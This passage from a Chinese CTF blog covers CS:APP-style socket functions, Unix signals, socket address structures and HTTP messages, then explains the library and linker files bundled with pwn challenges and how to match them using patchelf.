字节的缓冲区</span></span><br><span class="line"><span class="comment">// *service 指向大小为 servlen 字节的缓冲区</span></span><br><span class="line"><span class="comment">// 参数 flags 是一个位掩码，能够修改默认的行为</span></span><br></pre></td></tr></table></figure>
<p><strong>getnameinfo 函数</strong> 和 getaddrinfo 是相反的，将一个套接字地址结构转换成相应的主机和服务名字符串，它是已弃用的 gethostbyaddr 和 getservbyport 函数的新的替代品 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open_clientfd</span><span class="params">(<span class="keyword">char</span> *hostname, <span class="keyword">char</span> *port)</span></span>;</span><br><span class="line"><span class="comment">// *hostname：服务器运行的地址</span></span><br><span class="line"><span class="comment">// *port：指向端口</span></span><br></pre></td></tr></table></figure>
<p>客户端调用 open_clientfd 建立与服务器的连接 </p>
<p><strong>open_clientfd 函数</strong> 建立与服务器的连接，该服务器运行在主机 hostname 上，并在端口号 port 上监听连接请求 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open_listenfd</span><span class="params">(<span class="keyword">char</span> *port)</span></span>;</span><br><span class="line"><span class="comment">// *port：指向端口号</span></span><br></pre></td></tr></table></figure>
<p><strong>open_listenfd 函数</strong> 打开和返回一个监听描述符，这个描述符准备好在端口 port_h 接收连接请求 </p>
<h2 id="网络编程中的信号"><a href="#网络编程中的信号" class="headerlink" title="网络编程中的信号"></a>网络编程中的信号</h2><p><strong>进程组</strong></p>
<p>进程组就是一系列相互关联的进程集合，系统中的每一个进程也必须从属于某一个进程组，每个进程组中都会有一个唯一的 ID(process group id)，简称 PGID，PGID 一般等同于进程组的创建进程的 Process ID，而这个进进程一般也会被称为进程组先导(process group leader)，同一进程组中除了进程组先导外的其他进程都是其子进程</p>
<p>进程组的存在，方便了系统对多个相关进程执行某些统一的操作，例如：我们可以一次性发送一个信号量给同一进程组中的所有进程</p>
<p><strong>会话</strong></p>
<p>会话（session）是一个若干进程组的集合，同样的，系统中每一个进程组也都必须从属于某一个会话</p>
<ul>
<li>一个会话只拥有最多一个控制终端（也可以没有），该终端为会话中所有进程组中的进程所共用</li>
<li>一个会话中前台进程组只会有一个，只有其中的进程才可以和控制终端进行交互，除了前台进程组外的进程组，都是后台进程组</li>
</ul>
<p>和进程组先导类似，会话中也有会话先导(session leader)的概念，用来表示建立起到控制终端连接的进程，在拥有控制终端的会话中，session leader 也被称为控制进程(controlling process)，一般来说控制进程也就是登入系统的 shell 进程(login shell)</p>
<p><strong>带外数据</strong></p>
<p>带外数据用于迅速告知对方本端发生的重要的事件，它比普通的数据（带内数据）拥有更高的优先级， <strong>不论发送缓冲区中是否有排队等待发送的数据，它总是被立即发送</strong> ，带外数据的传输可以使用一条独立的传输层连接，也可以映射到传输普通数据的连接中，</p>
<p>​        // 实际应用中，带外数据是使用很少见，有 telnet 和 ftp 等远程非活跃程序</p>
<p>UDP没有没有实现带外数据传输，TCP也没有真正的带外数据，不过TCP利用头部的紧急指针标志和紧急指针，为应用程序提供了一种紧急方式，含义和带外数据类似，TCP的紧急方式利用传输普通数据的连接来传输紧急数据</p>
<p><strong>SIGHUP信号</strong>（关闭进程）</p>
<p>SIGHUP 信号在 <strong>用户终端连接(正常或非正常)结束</strong> 时发出, 通常是在终端的控制进程结束时, 通知同一session内的各个作业(任务)，这时它们与控制终端不再关联</p>
<p>系统对SIGHUP信号的默认处理是：<strong>终止收到该信号的进程</strong> ，所以若程序中没有捕捉该信号，当收到该信号时，进程就会退出</p>
<p>SIGHUP会在以下3种情况下被发送给相应的进程：</p>
<ul>
<li>终端关闭时，该信号被发送到 session 首进程以及作为 job 提交的进程（即用 &amp; 符号提交的进程）</li>
<li>session 首进程退出时，该信号被发送到该 session 中的前台进程组中的每一个进程</li>
<li>若父进程退出导致进程组成为孤儿进程组，且该进程组中有进程处于停止状态（收到SIGSTOP或SIGTSTP信号），该信号会被发送到该进程组中的每一个进程</li>
</ul>
<p>例如：在我们登录Linux时，系统会分配给登录用户一个终端(Session)，在这个终端运行的所有程序，包括前台进程组和后台进程组，一般都属于这个 Session，当用户退出Linux登录时，前台进程组和后台有对终端输出的进程将会收到SIGHUP信号，这个信号的默认操作为终止进程，因此前台进程组和后台有终端输出的进程就会中止</p>
<p>​        // 晦涩难懂，需要在实例中理解分析</p>
<p><strong>SIGPIPE信号</strong>（告知中断）</p>
<p>当 <strong>往一个写端关闭的管道或 socket 连接中连续写入数据时会引发 SIGPIPE 信号</strong>（引发 SIGPIPE 信号的写操作将设置 errno 为EPIPE）</p>
<p>在TCP通信中，当通信的双方中的一方close一个连接时，若另一方接着发数据，根据TCP协议的规定，会收到一个RST(Reset the connection)响应报文，若再往这个服务器发送数据时，系统会发出一个SIGPIPE信号给进程，<strong>告诉进程这个连接已经断开了，不能再写入数据</strong></p>
<ul>
<li>即使断开还可以进行一次通信，第二次发送数据时才触发SIGPIPE</li>
<li>可以用相应的 handle 进行处理SIGPIPE，完成想要的操作</li>
</ul>
<h2 id="网络编程结构体"><a href="#网络编程结构体" class="headerlink" title="网络编程结构体"></a>网络编程结构体</h2><p><strong>通用结构体：struct sockaddr，16个字节</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generic socket address structure (for connect, bind, and accept) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span>   sa_family;      <span class="comment">/* Protocol family */</span></span><br><span class="line">    <span class="keyword">char</span>       sa_data[<span class="number">14</span>];    <span class="comment">/* Address data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>struct sockaddr 是一个通用地址结构，这是为了统一地址结构的表示方法，统一接口函数，使不同的地址结构可以被bind() , connect() 等函数调用</p>
<p>sockaddr的缺陷：sa_data 把目标地址和端口信息混在一起了 </p>
<p><strong>通用结构体：struct sockaddr_storage，128个字节</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Structure large enough to hold any socket address </span></span><br><span class="line"><span class="comment">  (with the historical exception of AF_UNIX). 128 bytes reserved.  */</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ULONG_MAX &gt; 0xffffffff</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __ss_aligntype __uint64_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __ss_aligntype __uint32_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _SS_SIZE        128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _SS_PADSIZE     (_SS_SIZE - (2 * sizeof (__ss_aligntype)))</span></span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">     <span class="keyword">uint16_t</span>          ss_family;     <span class="comment">/* Address family */</span></span><br><span class="line">     __ss_aligntype   __ss_align;     <span class="comment">/* Force desired alignment.  */</span></span><br><span class="line">     <span class="keyword">char</span> __ss_padding[_SS_PADSIZE];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>struct sockaddr_storage 被设计为同时适合 struct sockaddr_in 和 struct sockaddr_in6 </p>
<p>为了避免试图知道要使用的IP版本，可以使用 struct sockaddr_storage，该版本可以保存其中任何一个，后将通过 connect()，bind() 等函数将其类型转换为 struct sockaddr 并以这种方式进行访问 </p>
<p><strong>IPv4：struct sockaddr_in，16个字节</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* IP socket address structure */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span>       sin_family;   <span class="comment">/* Protocol family (always AF_INET) */</span></span><br><span class="line">    <span class="keyword">uint16_t</span>       sin_port;     <span class="comment">/* 16位的端口号 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>     <span class="comment">/* 32位的IP地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> sin_zero[<span class="keyword">sizeof</span> (struct sockaddr) -</span><br><span class="line">                           <span class="keyword">sizeof</span> (<span class="keyword">sa_family_t</span>) -</span><br><span class="line">                           <span class="keyword">sizeof</span> (<span class="keyword">in_port_t</span>) -</span><br><span class="line">                           <span class="keyword">sizeof</span> (struct in_addr)]; <span class="comment">// sin_zero[8]</span></span><br><span class="line">    <span class="comment">/* Pad to sizeof(struct sockaddr) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> <span class="keyword">in_addr_t</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span>  &#123;</span></span><br><span class="line">     <span class="keyword">in_addr_t</span>   s_addr;            <span class="comment">/* IPv4 address */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>该结构体解决了 sockaddr 的缺陷，把 port 和 addr 分开储存在两个变量中 </p>
<p><strong>IPv6：struct sockaddr_in6，28个字节</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span>    sin6_family;      <span class="comment">/* AF_INET6 */</span></span><br><span class="line">    <span class="keyword">uint16_t</span>    sin6_port;        <span class="comment">/* Transport layer port # */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>    sin6_flowinfo;    <span class="comment">/* IPv6 flow information */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> <span class="title">sin6_addr</span>;</span>    <span class="comment">/* IPv6 address */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> sin6_scope_id;       <span class="comment">/* IPv6 scope-id */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">uint8_t</span> u6_addr8[<span class="number">16</span>];</span><br><span class="line">        <span class="keyword">uint16_t</span> u6_addr16[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">uint32_t</span> u6_addr32[<span class="number">4</span>];</span><br><span class="line">    &#125; in6_u;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> s6_addr                 in6_u.u6_addr8</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> s6_addr16               in6_u.u6_addr16</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> s6_addr32               in6_u.u6_addr32</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="服务器简析"><a href="#服务器简析" class="headerlink" title="服务器简析"></a>服务器简析</h2><p>每个网络应用都是基于客户端—服务器模型的，釆用这个模型，一个应用是由 <strong>一个服务器进程</strong> 和一个或者多个 <strong>客户端</strong> 进程组成 </p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646286501329-1646657383406-1646808754597-1646808862603.png" class width="1646286501329"> 
<p>个客户端—服务器事务由以下四步组成：</p>
<ol>
<li>当一个客户端需要服务时，它向服务器发送一个请求，发起一个事务，例如，当 Web 浏览器需要一个文件时，它就发送一个请求给 Web 服务器</li>
<li>服务器收到请求后，解释它，并以适当的方式操作它的资源，例如，当 Web 服务器收到浏览器发出的请求后，它就读一个磁盘文</li>
<li>服务器给客户端发送一个响应，并等待下一个请求，例如，Web 服务器将文件发送回客户端</li>
<li>客户端收到响应并处理它，例如，当 Web 浏览器收到来自服务器的一页后，就在屏幕上显示此页</li>
</ol>
<h2 id="服务器请求"><a href="#服务器请求" class="headerlink" title="服务器请求"></a>服务器请求</h2><p>一般的请求消息如下代码所示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /home.html HTTP/1.0 <span class="comment">&lt;!-- 请求消息行 --&gt;</span></span><br><span class="line">Accept: */* <span class="comment">&lt;!-- 请求消息头 --&gt;</span></span><br><span class="line">Host: localhost:GET /home.html HTTP/1.0</span><br><span class="line">Accept: */*</span><br><span class="line">Host: localhost:GET /home.html HTTP/1.0</span><br><span class="line">Accept: */*</span><br><span class="line">Host: localhost:</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3</span><br><span class="line">Connection: close</span><br><span class="line">Proxy-Connection: close</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="comment">&lt;!-- 消息正文 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">align</span>=<span class="string">&quot;middle&quot;</span> <span class="attr">src</span>=<span class="string">&quot;godzilla.gif&quot;</span>&gt;</span></span><br><span class="line">Dave O&#x27;Hallaron</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>请求消息行：请求消息的第一行为请求消息行</p>
<ul>
<li>例如：GET  /test/test.html  HTTP/1.1</li>
<li>GET 为请求方式，请求方式分为：Get（默认）、POST、DELETE、HEAD等<ul>
<li>GET：明文传输 不安全，数据量有限，不超过1kb</li>
<li>POST：暗文传输，安全，数据量没有限制</li>
</ul>
</li>
<li>/test/test.html 为URI，统一资源标识符</li>
<li>HTTP/1.1 为协议版本</li>
</ul>
</li>
<li><p>请求消息头：从第二行开始到空白行统称为请求消息头</p>
<ul>
<li>Accept：浏览器可接受的MIME类型告诉服务器客户端能接收什么样类型的文件</li>
<li>Accept-Charset：浏览器通过这个头告诉服务器，它支持哪种字符集</li>
<li>Accept-Encoding：浏览器能够进行解码的数据编码方式，比如 gzip</li>
<li>Accept-Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到，可以在浏览器中进行设置</li>
<li>Host：初始URL中的主机和端口</li>
<li>Referrer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面</li>
<li>Content-Type：内容类型告诉服务器浏览器传输数据的MIME类型，文件传输的类型</li>
<li>If-Modified-Since：利用这个头与服务器的文件进行比对，如果一致，则从缓存中直接读取文件</li>
<li>User-Agent：浏览器类型</li>
<li>Content-Length：表示请求消息正文的长度</li>
<li>Connection：表示是否需要持久连接。如果服务器看到这里的值为“Keep -Alive”，或者看到请求使用的是HTTP 1.1（HTTP 1.1默认进行持久连接）</li>
<li>Cookie：用于分辨两个请求是否来自同一个浏览器，以及保存一些状态信息</li>
<li>Date：请求时间GMT</li>
</ul>
</li>
<li><p>消息正文：当请求方式是[POST]方式时，才能看见消息正文，消息正文就是要传输的一些数据，如果没有数据需要传输时，消息正文为空</p>
</li>
</ul>
<h2 id="服务器响应"><a href="#服务器响应" class="headerlink" title="服务器响应"></a>服务器响应</h2><p>一般的响应如下代码所示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK <span class="comment">&lt;!-- 响应消息行 --&gt;</span></span><br><span class="line">Server: Tiny Web Server <span class="comment">&lt;!-- 响应消息头 --&gt;</span></span><br><span class="line">Content-length: 120</span><br><span class="line">Content-type: text/html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="comment">&lt;!-- 响应正文 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">align</span>=<span class="string">&quot;middle&quot;</span> <span class="attr">src</span>=<span class="string">&quot;godzilla.gif&quot;</span>&gt;</span></span><br><span class="line">Dave O&#x27;Hallaron</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>响应消息行：第一行响应消息为响应消息行<ul>
<li>例如：HTTP/1.0 200 OK</li>
<li>HTTP/1.0 为协议版本</li>
<li>200 为响应状态码，常用的响应状态码有40余种，这里我们仅列出几种，详细请看：<ul>
<li>200：一切正常</li>
<li>302/307：临时重定向</li>
<li>304：未修改，客户端可以从缓存中读取数据，无需从服务器读取</li>
<li>404：服务器上不存在客户端所请求的资源</li>
<li>500：服务器内部错误</li>
</ul>
</li>
<li>OK 为状态码描述</li>
</ul>
</li>
<li>响应消息头：<ul>
<li>Location：指示新的资源的位置通常和302/307一起使用，完成请求重定向</li>
<li>Server：指示服务器的类型</li>
<li>Content-Encoding：服务器发送的数据采用的编码类型</li>
<li>Content-Length：告诉浏览器正文的长度</li>
<li>Content-Language：服务发送的文本的语言</li>
<li>Content-Type：服务器发送的内容的MIME类型</li>
<li>Last-Modified：文件的最后修改时间</li>
<li>Refresh：指示客户端刷新频率，单位是秒</li>
<li>Content-Disposition：指示客户端下载文件</li>
<li>Set-Cookie：服务器端发送的Cookie</li>
<li>Expires：-1</li>
<li>Cache-Control：no-cache (1.1)  </li>
<li>Pragma：no-cache   (1.0)  表示告诉客户端不要使用缓存</li>
<li>Connection：close/Keep-Alive   </li>
<li>Date：请求时间</li>
</ul>
</li>
<li>响应正文：即网页的源代码（F12可查看）</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/01/%E8%A7%A3%E6%9E%90pwn%E9%A2%98%E4%B8%AD%E9%99%84%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/01/%E8%A7%A3%E6%9E%90pwn%E9%A2%98%E4%B8%AD%E9%99%84%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6/" class="post-title-link" itemprop="url">解析pwn题中附带的文件（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-01 02:19:14" itemprop="dateCreated datePublished" datetime="2022-01-01T02:19:14+08:00">2022-01-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-07 21:19:00" itemprop="dateModified" datetime="2022-01-07T21:19:00+08:00">2022-01-07</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="解析pwn题中附带的文件"><a href="#解析pwn题中附带的文件" class="headerlink" title="解析pwn题中附带的文件"></a>解析pwn题中附带的文件</h2><img src="/2022/01/01/%E8%A7%A3%E6%9E%90pwn%E9%A2%98%E4%B8%AD%E9%99%84%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6/1640939836621.png" class width="1640939836621"> 
<img src="/2022/01/01/%E8%A7%A3%E6%9E%90pwn%E9%A2%98%E4%B8%AD%E9%99%84%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6/1640939961296.png" class width="1640939961296"> 
<p>环境对pwn题至关重要，有时候本地打不通但服务器可以打通，有时候却恰恰相反，这些都与pwn题的环境有关</p>
<p>在一个pwn题中，除了有一个服务器上的样本文件以外，还有一些其他文件</p>
<p>这些文件就是题目作者交给我们的“题目环境”</p>
<p>我已经在“题目环境”这一块吃了不少亏了，主要是不知道这些文件是干什么的，又或许不明白这些文件的用法，所以我打算学习一下这些文件的用途，在此记录</p>
<hr>
<h2 id="libc-so"><a href="#libc-so" class="headerlink" title="libc.so"></a>libc.so</h2><p><strong>libc.so</strong>是glibc库的软链接，一般为 <strong>libc.so.6</strong> ，一个类似于WINDOWS下的一个快捷指向型的文件</p>
<p>但是pwn题中给的<strong>libc.so.6</strong>可不是软链接，而是glibc库本身</p>
<img src="/2022/01/01/%E8%A7%A3%E6%9E%90pwn%E9%A2%98%E4%B8%AD%E9%99%84%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6/1640941622614.png" class width="1640941622614"> 
<p>软链接 <strong>libc.so.6</strong> 所链接的glibc就是“/lib/i386-linux-gnu”中的 <strong>libc.so.6</strong> </p>
<p>​        //在本机进行操作时，程序会默认<strong>libc.so.6</strong>为glibc库，但题目文件是不是这个库就不一定了</p>
<p>如果pwn题给出了glibc库那就简单了，可以直接用ELF模块引入</p>
<h2 id="ld-linux-so"><a href="#ld-linux-so" class="headerlink" title="ld-linux.so"></a>ld-linux.so</h2><p>当操作系统加载一个动态链接的应用程序时，它必须找到并加载它执行该应用程序所依赖的<strong>动态库</strong>（以so为后缀的文件），而 <strong>ld-linux.so</strong> 是链接器的运行时的组件，是专门负责寻找库文件的库，ld-linux.so将按一定顺序找到libc.so.6库再给cat调用</p>
<p>​        // ld-linux.so的位置是写死在程序中的，gcc在编译程序时就写死在里面了 </p>
<img src="/2022/01/01/%E8%A7%A3%E6%9E%90pwn%E9%A2%98%E4%B8%AD%E9%99%84%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6/1640971840935.png" class width="1640971840935"> 
<p>程序默认的 <strong>ld-linux.so</strong> 就是“/lib/i386-linux-gnu”中的 <strong>ld-linux.so.2</strong></p>
<p>如果pwn题给出了ld-linux.so，那么它一定在链接器上动了手脚，需要用<strong>patchelf</strong>修改链接器组件为题目给出的ld-linux.so，以保证环境一致</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ patchelf --<span class="built_in">set</span>-interpreter /lib/my-ld-linux.so<span class="number">.2</span> my-program</span><br><span class="line"><span class="comment">#&#x27;/lib/my-ld-linux.so.2&#x27;：ld-linux.so文件的路径</span></span><br><span class="line"><span class="comment">#&#x27;my-program&#x27;：pwn题样本文件的名称</span></span><br></pre></td></tr></table></figure>
<h2 id="libc-A-BC-so"><a href="#libc-A-BC-so" class="headerlink" title="libc-A.BC.so"></a>libc-A.BC.so</h2><p><strong>libc-A.BC.so</strong> 和 <strong>libc.so.6</strong> 是同一个东西（都是glibc共享库）</p>
<p>只不过<strong>libc-A.BC.so</strong>的命名方式更加规范：</p>
<p>lib表示库文件，so表示动态链接，A为主版本号，B为次版本号，C为发布版本号</p>
<p>标准命名可以方便pwn手一下子定位libc版本，但是有些pwn题为了隐藏libc版本，就故意把glibc库文件统一命名为libc.so.6</p>
<img src="/2022/01/01/%E8%A7%A3%E6%9E%90pwn%E9%A2%98%E4%B8%AD%E9%99%84%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6/1640973216192.png" class width="1640973216192"> 
<p>如果pwn题给出了libc-A.BC.so，那就连libc版本都不用测了，直接用<strong>patchelf</strong>改</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ patchelf ./my-program --replace-needed libc.so<span class="number">.6</span> ./other-libs</span><br><span class="line"><span class="comment">#&#x27;/other-libs&#x27;：设置rpath的路径</span></span><br><span class="line"><span class="comment">#&#x27;my-program&#x27;：pwn题样本文件的名称</span></span><br></pre></td></tr></table></figure>
<p>程序会优先从rpath中获取程序的glibc库</p>
<h2 id="ld-A-BC-so"><a href="#ld-A-BC-so" class="headerlink" title="ld-A.BC.so"></a>ld-A.BC.so</h2><p><strong>ld-A.BC.so</strong> 和 <strong>ld-linux.so</strong> 是同一个东西（都是链接器组件）</p>
<p>ld表示链接器组件，so表示动态链接，A为主版本号，B为次版本号，C为发布版本号</p>
<img src="/2022/01/01/%E8%A7%A3%E6%9E%90pwn%E9%A2%98%E4%B8%AD%E9%99%84%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6/1640973934926.png" class width="1640973934926"> 
<p>同样，用<strong>patchelf</strong>修改链接器组件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ patchelf --<span class="built_in">set</span>-interpreter /lib/my-ld-linux.so<span class="number">.2</span> my-program</span><br></pre></td></tr></table></figure>
<h2 id="libseccomp-so"><a href="#libseccomp-so" class="headerlink" title="libseccomp.so"></a>libseccomp.so</h2><p>这个就比较高端了，<strong>seccomp</strong> 又被称为沙盒，是一种保护机制</p>
<p><strong>libseccomp</strong> 是一个 C 语言开发的 Linux 内核系统调用过滤帮助库，很多容器项目都使用到它，比如 containerd、docker、runc </p>
<p><strong>libseccomp.so</strong> 就是 libseccomp 所使用的动态链接</p>
<p><strong>libseccomp.so.2</strong> 就是 <strong>libseccomp.so</strong> 的常用版本，如果pwn题中出现了libseccomp.so.2，就说明它开了沙盒的</p>
<p>如果只是单纯的ROP题目，libseccomp.so.2可有可无，因为有专门的工具用于检查沙盒，但是如果题目设计到 <strong>堆</strong> 就不同了，如果使用了 libseccomp.so.2 来开保护沙盒，那么会在程序中创建各个堆块，这可能会导致远程和本地的堆空间的布局不一致 </p>
<p>目前没有找到什么解决的办法</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/">

